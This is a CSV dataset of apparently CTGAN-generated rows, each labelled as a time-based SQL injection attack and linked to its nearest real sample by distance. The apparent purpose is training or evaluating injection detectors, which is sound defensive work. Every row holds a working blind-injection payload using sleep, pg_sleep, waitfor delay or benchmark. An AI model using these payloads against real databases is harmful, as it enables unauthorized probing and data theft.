id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000453,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,5.303682382006099
CTGAN_000454,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,5.949912518643123
CTGAN_000455,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,5.735170011477383
CTGAN_000456,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,6.314255722169093
CTGAN_000457,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,6.858466791195668
CTGAN_000458,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,4.838777765340425
CTGAN_000459,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,11.023371947793867
CTGAN_000460,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,4.367517601977972
CTGAN_000461,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000082,11.086223530081513
CTGAN_000462,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,7.48841703529633
CTGAN_000463,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,3.7969208873767943
CTGAN_000464,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,6.217870807865081
CTGAN_000465,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.717650710246798
CTGAN_000466,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,8.101847477849358
CTGAN_000467,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,7.591115732176831
CTGAN_000468,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,5.02275509128577
CTGAN_000469,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,8.890268771437158
CTGAN_000470,attack,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,nearest_attack_euclidean,R000133,7.286873735625936
CTGAN_000471,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,5.534538837675652
CTGAN_000472,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,8.528136065052037
CTGAN_000473,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,6.116541407714448
CTGAN_000474,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,6.40697875012775
CTGAN_000475,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,5.653362547696173
CTGAN_000476,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,7.28144050176798
CTGAN_000477,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000147,6.757988317067671
CTGAN_000478,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,10.127214279613781
CTGAN_000479,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,6.565643404050828
CTGAN_000480,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,7.0922579882665415
CTGAN_000481,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,6.864168523763613
CTGAN_000482,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,7.105405217704414
CTGAN_000483,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.923917991309406
CTGAN_000484,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,6.985295195332445
CTGAN_000485,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,6.789217151396702
CTGAN_000486,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,5.108778530883471
CTGAN_000487,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,7.001444194292289
CTGAN_000488,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.503532146287058
CTGAN_000489,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000082,7.860217162336647
CTGAN_000490,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,5.465822309214907
CTGAN_000491,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,5.009939397016619
CTGAN_000492,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.608465614959998
CTGAN_000493,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,6.51426739455265
CTGAN_000494,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,6.028149598643656
CTGAN_000495,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,6.158008615305016
CTGAN_000496,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,7.578463084972662
CTGAN_000497,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,5.2850443010741905
CTGAN_000498,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.82600182291184
CTGAN_000499,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.218482924259146
CTGAN_000500,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,9.724627954286719
CTGAN_000501,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.8661115623783235
CTGAN_000502,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,7.863218993435539
CTGAN_000503,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,6.01237904176591
CTGAN_000504,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.707725025096746
CTGAN_000505,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000140,4.86127689051452
CTGAN_000506,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,6.837358025399063
CTGAN_000507,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000147,8.6907843725927
CTGAN_000508,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.167701311535652
CTGAN_000509,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000108,5.722029017432145
CTGAN_000510,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,7.238912687107569
CTGAN_000511,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,7.376289118741331
CTGAN_000512,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,5.783047220235685
CTGAN_000513,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,4.779947026010424
CTGAN_000514,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,6.687867859528572
CTGAN_000515,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,7.3638785847125074
CTGAN_000516,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000150,6.384877564730303
CTGAN_000517,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.1572578474418895
CTGAN_000518,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,7.4981039512622285
CTGAN_000519,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,6.956646329575733
CTGAN_000520,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,5.35585709401074
CTGAN_000521,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,6.797811945965995
CTGAN_000522,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,4.2623275269104886
CTGAN_000523,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.619564448608451
CTGAN_000524,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,6.769907078347762
CTGAN_000525,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.224929781738229
CTGAN_000526,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,7.319442915324497
CTGAN_000527,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,7.875863180960618
CTGAN_000528,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,7.3816866247771635
CTGAN_000529,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.151032029634491
CTGAN_000530,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,8.006153252740742
CTGAN_000531,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,6.3563066484352095
CTGAN_000532,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,8.053502283638505
CTGAN_000533,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.735736077833808
CTGAN_000534,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.764739944154057
CTGAN_000535,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,7.324594186788289
CTGAN_000536,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,7.757630223003178
CTGAN_000537,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,5.729476505194377
CTGAN_000538,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,7.429948171619255
CTGAN_000539,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,8.692336246477746
CTGAN_000540,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.30750285908512
CTGAN_000541,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,6.828417473673628
CTGAN_000542,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,8.209658245086553
CTGAN_000543,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,7.391513378470464
CTGAN_000544,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,6.16580924173354
CTGAN_000545,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,3.4645078883867626
CTGAN_000546,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,5.8202720464477755
CTGAN_000547,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,5.791004820127694
CTGAN_000548,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,4.6353668155384575
CTGAN_000549,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,5.8759453109997235
CTGAN_000550,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.603801609760677
CTGAN_000551,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,6.477415124974185
CTGAN_000552,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,7.325197338412905
CTGAN_000553,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,7.542324992918826
CTGAN_000554,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.833979681143316
CTGAN_000555,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.939282669132729
CTGAN_000556,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,5.217129508392757
CTGAN_000557,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,7.728807505644501
CTGAN_000558,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.659455373880044
CTGAN_000559,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,11.244480531570355
CTGAN_000560,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.634352932380953
CTGAN_000561,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,6.364076111961515
CTGAN_000562,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,5.799866782841056
CTGAN_000563,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,5.066505633701305
CTGAN_000564,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,7.279956994683424
CTGAN_000565,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,7.73428069829923
CTGAN_000566,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,7.296400256624099
CTGAN_000567,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,8.662870775038344
CTGAN_000568,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,7.476542026115813
CTGAN_000569,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,5.393355227265204
CTGAN_000570,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,6.2566078846077104
CTGAN_000571,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,5.025889145181161
CTGAN_000572,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,6.968320065436164
CTGAN_000573,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.713003581622838
CTGAN_000574,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.068129766798182
CTGAN_000575,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,6.911477604593059
CTGAN_000576,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,7.199792063173337
CTGAN_000577,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,7.9141495245068665
CTGAN_000578,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,6.623377302176658
CTGAN_000579,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,8.232680347212154
CTGAN_000580,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,6.7891992021355865
CTGAN_000581,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,6.122231106924762
CTGAN_000582,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,7.773008631163688
CTGAN_000583,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,6.323137610359237
CTGAN_000584,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,5.7703526664602345
CTGAN_000585,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,9.543637706427498
CTGAN_000586,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,7.909524129142067
CTGAN_000587,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,6.410677141026029
CTGAN_000588,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,7.22088909329687
CTGAN_000589,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,5.803554000375732
CTGAN_000590,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,7.2171992628634705
CTGAN_000591,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,8.03117500285268
CTGAN_000592,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,8.185372824803773
CTGAN_000593,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.117321569211458
CTGAN_000594,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,5.901807197089124
CTGAN_000595,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.128089219046933
CTGAN_000596,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,7.437926754574217
CTGAN_000597,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.1553636534555105
CTGAN_000598,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,6.147227349696325
CTGAN_000599,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,6.993796183184163
CTGAN_000600,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,6.825178549441229
CTGAN_000601,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,7.208669261983349
CTGAN_000602,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,5.996273971517328
CTGAN_000603,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.35902466305193
CTGAN_000604,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.434069456251844
CTGAN_000605,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,7.288224083875995
CTGAN_000606,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,7.725950052166391
CTGAN_000607,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,5.820957550134578
CTGAN_000608,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,4.197733852679154
CTGAN_000609,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,7.980643515400711
CTGAN_000610,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,7.970707332373767
CTGAN_000611,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000129,6.137911737805889
CTGAN_000612,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,5.260554684326396
CTGAN_000613,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000129,5.833262662694874
CTGAN_000614,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,9.144487468882925
CTGAN_000615,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,7.439589316823431
CTGAN_000616,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,7.741564528947535
CTGAN_000617,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,6.328050159642227
CTGAN_000618,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,8.604047460435478
CTGAN_000619,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,8.980117906509502
CTGAN_000620,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,8.841357888803682
CTGAN_000621,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,5.873124697531839
CTGAN_000622,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,4.358325284890449
CTGAN_000623,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,7.24014335596618
CTGAN_000624,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,6.561902685637216
CTGAN_000625,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,8.43839779702454
CTGAN_000626,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.778458395838981
CTGAN_000627,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,5.994102349509249
CTGAN_000628,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,6.535629659823332
CTGAN_000629,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.240029687591617
CTGAN_000630,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,10.91255208932871
CTGAN_000631,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,8.741301447704178
CTGAN_000632,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,9.609097220186356
CTGAN_000633,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.373552507701962
CTGAN_000634,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,5.630909231730765
CTGAN_000635,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,9.91554793936074
CTGAN_000636,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,7.999259026707284
CTGAN_000637,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.954228625270002
